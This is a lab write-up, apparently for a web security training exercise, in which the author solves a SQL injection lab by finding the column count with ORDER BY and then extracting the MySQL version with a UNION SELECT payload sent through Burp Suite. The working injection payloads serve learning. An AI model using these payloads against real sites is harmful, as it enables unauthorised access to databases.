# SQL injection attack, querying the database type and version on MySQL and Microsoft

## Information

- Lab: SQLi
- Level: PRACTITIONER
- Description:

    Make the database retrieve the strings:

    '8.0.42-0ubuntu0.20.04.1'

## Solution

![](<Images/SQL injection attack, querying the database type and version on MySQL and Microsoft 1.png>)

When I opened the website, I tested the `Corporate gifts` category and found untrusted data in the URL.

![](<Images/SQL injection attack, querying the database type and version on MySQL and Microsoft 2.png>)

I intercepted the request using Burp Suite and added a single quote to the parameter:

```txt
Corporate gifts'
```

![](<Images/SQL injection attack, querying the database type and version on MySQL and Microsoft 3.png>)

The server returned an error.

![](<Images/SQL injection attack, querying the database type and version on MySQL and Microsoft 4.png>)

I used a `UNION` attack to retrieve the database version information, but first I needed to determine the number of columns using `ORDER BY`.

Payload format:

```sql
a' ORDER BY <number_of_column> -- -
```

Testing:

```sql
a' ORDER BY 5 -- -
```

Result: Error

```sql
a' ORDER BY 2 -- -
```

Result: Valid

```sql
a' ORDER BY 3 -- -
```

Result: Error

From this, I determined that the query has 2 columns.

Since the backend database is MySQL, I used the following payload to retrieve the database version:

```sql
a' UNION SELECT NULL, version() -- -
```

![](<Images/SQL injection attack, querying the database type and version on MySQL and Microsoft 5.png>)

After sending the request in Burp Suite, the database version information was displayed successfully and the lab was solved.

![](<Images/SQL injection attack, querying the database type and version on MySQL and Microsoft 6.png>)